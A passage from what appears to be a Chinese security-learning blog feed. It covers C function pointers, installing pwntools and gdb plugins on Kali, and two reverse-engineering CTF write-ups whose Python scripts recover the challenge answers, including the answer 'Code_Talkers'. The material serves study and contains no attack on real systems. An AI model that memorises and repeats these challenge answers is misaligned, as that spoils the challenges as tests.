class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*pf)(<span class="type">int</span>) = &amp;f;  </span><br></pre></td></tr></table></figure><p>初始化表达式中的&amp;操作符是可选的，因为函数名被使用时总是由编译器把它转换为函数指针。&amp;操作符只是显式地说明了编译器将隐式执行的任务。</p><p>在函数指针被声明并且初始化之后，我们就可以使用三种方式调用函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ans;</span><br><span class="line">ans = f(<span class="number">25</span>);</span><br><span class="line">ans = (*pf)(<span class="number">25</span>);</span><br><span class="line">ans = pf(<span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>第1条语句简单地<strong>使用名字调用函数f</strong>， 但它的<strong>执行过程</strong>可能和你想象的不太一样。函数名 f 首先被转换为一个函数指针，该指针指定函数在内存中的位置。然后，函数调用操作符调用该函数，执行开始于这个地址的代码。</p><p>第2条语句<strong>对pf执行间接访问操作</strong>，它把函数指针转换为一个函数名。这个转换并不是真正需要的，因为编译器在执行函数调用操作符之前又会把它转换回去。不过，这条语句的效果和第1条语句是完全一样的。</p><p>第3条语句和前两条语句的效果是一样的。间接访问操作并非必需，因为编译器需要的是一个函数指针。这个例子显示了函数指针通常是如何使用的。</p><blockquote><p>参考：</p><p>​<a href="http://c.biancheng.net/cpp/html/3248.html">C语言函数指针（指向函数的指针）</a></p><p>​C和指针</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;函数指针的定义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#函数指针的定义&quot;&gt;&lt;/a&gt; 函数指针的定义&lt;/h1&gt;
&lt;p&gt;程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="c" scheme="https://www.rgzzplus.com/tags/c/"/>
    
    <category term="函数指针" scheme="https://www.rgzzplus.com/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>kali搭建pwn环境</title>
    <link href="https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</id>
    <published>2022-07-27T07:32:48.000Z</published>
    <updated>2022-08-01T11:18:47.431Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="系统环境"><a class="markdownIt-Anchor" href="#系统环境"></a> 系统环境</h1><p>**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)</p><h1 id="搭建步骤"><a class="markdownIt-Anchor" href="#搭建步骤"></a> 搭建步骤</h1><h2 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h2><p>在主目录下创建一个 tools 目录，用来存放下载下来的文件，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105421464.png" alt="image-20220724105421464"></p><h2 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h2><p>安装pwntools</p><ol><li>进入tools文件夹里面</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105554318.png" alt="image-20220724105554318"></p><ol start="2"><li>把 pwntools clone下来</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724110621476.png" alt="image-20220724110621476"></p><ol start="3"><li>安装所需环境</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724111211189.png" alt="image-20220724111211189"></p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112043388.png" alt="image-20220724112043388"></p><ol start="4"><li>更新 pip</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>我之前安装过python3 和相关的依赖，所以才会出现 黄字</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112358360.png" alt="image-20220724112358360"></p><ol start="5"><li>使用 pip 安装并更新 pwntools</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120351366.png" alt="image-20220724120351366"></p><p>到这里 pwntools 环境已经搭建好了</p><h2 id="搭建gdb调试环境"><a class="markdownIt-Anchor" href="#搭建gdb调试环境"></a> 搭建gdb调试环境</h2><ol><li>安装gdb-multiarch，用作gdb客户端进行调试，是任何架构的通用客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120607625.png" alt="image-20220724120607625"></p><p>检查安装是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -v</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120626220.png" alt="image-20220724120626220"></p><ol start="2"><li>安装插件</li></ol><p>pwndbg是一个方便 gdb 使用的插件</p><p>先将pwndbg git 下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121020311.png" alt="image-20220724121020311"></p><p>然后进入到文件夹中，执行 <a href="http://setup.sh">setup.sh</a> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tools/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121220606.png" alt="image-20220724121220606"></p><p>检查插件是否挂载成功，在终端输入gdb，结果如下：</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724134953067.png" alt="image-20220724134953067"></p><p>其它插件peda，def安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135333030.png" alt="image-20220724135333030"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git  </span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135910787.png" alt="image-20220724135910787"></p><p>安装插件依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install keystone-engine ropper keystone-engine</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140304432.png" alt="image-20220724140304432"></p><p>在这里我发现我没有切换目录下载插件，但是没关系，我们将gef 和peda 文件夹放到tools里</p><p>在 gdbinit 中挂载插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure><p>按 i 键编辑，从第二行开始输入下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source /home/kali/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/kali/tools/gef/gef.py</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140843053.png" alt="image-20220724140843053"></p><p>选择插件中的其中一个，其他的注释掉，按esc键并输入:wq退出即可。</p><p>至此，pwn环境搭建完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;系统环境&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#系统环境&quot;&gt;&lt;/a&gt; 系统环境&lt;/h1&gt;
&lt;p&gt;**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)&lt;/</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="pwn" scheme="https://www.rgzzplus.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Reversing-x64Elf-100</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/</id>
    <published>2022-07-24T02:39:54.000Z</published>
    <updated>2022-07-24T02:42:33.525Z</updated>
    
    <content type="html"><![CDATA[<p>附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。</p><blockquote><p>google：.re 文件大多属于 Image File。<a href="https://filext.com/file-extension/~RE">原文</a></p></blockquote><p>然后我试着拖进 IDA，能解析。</p><p><img src="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/image-20220722195957027.png" alt="image-20220722195957027"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4006FD((__int64)s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从反汇编代码中可以看到 sub_40006FD 函数是关键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4006FD</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  __int64 v3[<span class="number">4</span>]; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = (__int64)<span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = (__int64)<span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = (__int64)<span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(v3[i % <span class="number">3</span>] + <span class="number">2</span> * (i / <span class="number">3</span>)) - *(<span class="type">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*(char *)(v3[i % 3] + 2*(i / 3)) 是一个二维数组，它与 a1[i] 相差 1。</p><p>要想得到 a1 ，就 *(char *)(v3[i % 3] + 2*(i / 3)) - 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">&quot;Dufhbmf&quot;</span>,<span class="string">&quot;pG`imos&quot;</span>,<span class="string">&quot;ewUglpt&quot;</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i % <span class="number">3</span>][<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)])-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>结果：Code_Talkers</p><blockquote><p>注意：用 int(i/3) 是由于 python 不会像 c/c++ 一样自动将触发取整。</p></blockquote><blockquote><p>参考:<a href="https://www.cnblogs.com/dyhaohaoxuexi/p/10610272.html">Reversing-x64Elf-100</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;google：.re 文件大多属于 Image File。&lt;a href=&quot;https://filext.com/file-exten</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界666</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/</id>
    <published>2022-07-24T02:39:11.000Z</published>
    <updated>2022-07-24T02:41:47.094Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2">666</a></p><p>将附件下载到本地后，直接拖进 IDA 进行分析，点击进入 main 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"> ; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line"> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">                 public main</span><br><span class="line"> main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line"></span><br><span class="line"> s               = byte ptr -1E0h   ; s[480]</span><br><span class="line"> var_F0          = byte ptr -0F0h   ; var_fo[240],存放scanf输入参数</span><br><span class="line"></span><br><span class="line"> ; __unwind &#123;</span><br><span class="line">            push    rbp</span><br><span class="line">            mov     rbp, rsp</span><br><span class="line">            sub     rsp, 1E0h</span><br><span class="line">            lea     rax, [rbp+s]</span><br><span class="line">            mov     edx, 1Eh        ; n</span><br><span class="line">            mov     esi, 0          ; c</span><br><span class="line">            mov     rdi, rax        ; s</span><br><span class="line">            call    _memset; memset(s, 0, 0x1EuLL);</span><br><span class="line">            </span><br><span class="line">            lea     rdi, format     ; &quot;Please Input Key: &quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    _printf</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rax</span><br><span class="line">            lea     rdi, aS         ; &quot;%s&quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    ___isoc99_scanf</span><br><span class="line">            </span><br><span class="line">            lea     rdx, [rbp+s]</span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rdx</span><br><span class="line">            mov     rdi, rax</span><br><span class="line">            call    encode;关键函数，这里对输入字符进行了加密</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _strlen</span><br><span class="line">mov     rdx, rax</span><br><span class="line">mov     eax, cs:key</span><br><span class="line">cdqe</span><br><span class="line">cmp     rdx, rax</span><br><span class="line">jnz     short loc_138D</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">lea     rsi, enflag     ; &quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span><br><span class="line">mov     rdi, rax        ; s1</span><br><span class="line">call    _strcmp</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_1381</span><br><span class="line">lea     rdi, aYouAreRight ; &quot;You are Right&quot;</span><br><span class="line">call    _puts</span><br><span class="line">jmp     short loc_138D</span><br><span class="line"> ; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"> loc_1381:                               ; CODE XREF: main+A0↑j</span><br><span class="line">lea     rdi, aFlagThis1sF4ck ; &quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span><br><span class="line">            call    _puts</span><br><span class="line"></span><br><span class="line"> loc_138D:                               ; CODE XREF: main+86↑j</span><br><span class="line">                                         ; main+AE↑j</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            leave</span><br><span class="line">            retn</span><br><span class="line">; &#125; // starts at 12D1</span><br><span class="line"> main       endp</span><br></pre></td></tr></table></figure><p>按下 F5 ，反汇编，这下就清楚程序运行逻辑了，程序对输入字符进行字符编码，然后与 enflag（“izwhroz”“w&quot;v.K”.Ni&quot;）进行比较。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">240</span>]; <span class="comment">// [rsp+0h] [rbp-1E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">240</span>]; <span class="comment">// [rsp+F0h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Input Key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  encode(v5, (__int64)s);<span class="comment">//关键函数</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v5) == key )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, enflag) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are Right&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以关键是要知道 encode 函数怎么加密输入的，之后用 encode 解密enflag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != key )<span class="comment">//12h,18位</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your Length is Wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i + <span class="number">64</span>] = key ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v3[i + <span class="number">33</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;<span class="comment">//加密算法</span></span><br><span class="line">      </span><br><span class="line">    *(_BYTE *)(a2 + i) = v3[i + <span class="number">64</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1LL</span>) = v3[i + <span class="number">33</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2LL</span>) = v3[i + <span class="number">2</span>];<span class="comment">//指针赋值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python 脚本，加密脚本逆着小写，flag 就出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span></span><br><span class="line">enflag=[<span class="number">105</span>, <span class="number">122</span>, <span class="number">119</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">34</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">34</span>, <span class="number">118</span>, <span class="number">46</span>, <span class="number">75</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">0</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i])-<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i+<span class="number">1</span>])+<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="number">18</span>^enflag[i+<span class="number">2</span>]^<span class="number">6</span>)    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110529421">攻防世界-Reverse-666</a></p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110507144">CTF-Python常用函数语段详解</a></p><p>​<a href="http://www.ab126.com/goju/1711.html">ASCII 在线转换器</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目地址：&lt;a href=&quot;https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2&quot;&gt;666&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;将附件下载到本地后，直接拖进 I</summary>
      
    
    
